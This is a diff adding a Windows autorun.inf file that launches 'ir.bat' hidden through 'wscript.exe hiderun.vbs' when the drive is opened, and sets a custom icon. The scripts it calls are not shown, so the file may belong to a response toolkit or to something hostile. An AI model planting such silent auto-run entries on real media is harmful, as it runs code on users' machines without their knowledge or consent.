@@ -1,0 +1,6 @@
+[autorun] 
+open1=wscript.exe hiderun.vbs ir.bat
+open=ir.bat
+icon=icon1.ico,0 
+
+
